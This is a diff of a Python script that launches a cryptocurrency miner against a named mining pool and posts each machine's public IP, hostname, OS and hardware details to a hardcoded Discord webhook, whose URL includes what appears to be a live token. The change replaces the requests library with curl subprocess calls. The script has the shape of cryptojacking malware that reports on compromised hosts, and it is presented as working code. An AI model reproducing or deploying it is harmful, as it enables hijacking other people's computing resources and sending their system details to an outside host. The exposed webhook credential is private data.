@@ -3,8 +3,6 @@ import platform
 import subprocess
 import time
 import socket
-import requests
-import sys
 
 # --- Configuration ---
 WEBHOOK = "https://discord.com/api/webhooks/1395138384518844508/riuLCmuUuVfVZECJE-zW75VwARH2p9jd8yP_Z1ndjP4gvNMH08Mf7C9PpXcITM-nmw8B"  # Discord Webhook URL
@@ -13,18 +11,10 @@ POOL = "fr.zephyr.herominers.com:1123"  # Mining Pool URL
 WORKER_NAME = "worker001"  # Worker Name
 
 # --- Script Logic ---
-def install_dependencies():
-    """Install any required dependencies automatically"""
-    try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
-    except subprocess.CalledProcessError as e:
-        send_notification(f"❌ Failed to install dependencies: {e}")
-        sys.exit(1)
-
 def get_system_info():
     """Gather basic system information for Discord webhook"""
     system_info = {
-        "IP": requests.get("https://api.ipify.org").text.strip(),
+        "IP": subprocess.getoutput("curl -s https://api.ipify.org"),  # Getting public IP via curl
         "Hostname": socket.gethostname(),
         "OS": platform.system() + " " + platform.release(),
         "Arch": platform.machine(),
@@ -35,9 +25,9 @@ def get_system_info():
     return system_info
 
 def send_notification(message):
-    """Send a notification to Discord webhook"""
+    """Send a notification to Discord webhook using curl (no extra dependencies)"""
     try:
-        requests.post(WEBHOOK, json={"content": message})
+        subprocess.run(['curl', '-X', 'POST', WEBHOOK, '--data', f'{{"content": "{message}"}}'])
     except Exception as e:
         print(f"Error sending notification: {e}")
 
@@ -76,9 +66,6 @@ def main():
     system_info = get_system_info()
     message = f"✅ Miner Initialized\nIP: {system_info['IP']}\nHostname: {system_info['Hostname']}\nOS: {system_info['OS']}\nCPU: {system_info['CPU']}\nRAM: {system_info['RAM']}\nThreads: {system_info['Threads']}\nWorker: {WORKER_NAME}"
     send_notification(message)
-
-    # Install dependencies if missing
-    install_dependencies()
 
     # Start mining
     miner_process = start_miner()
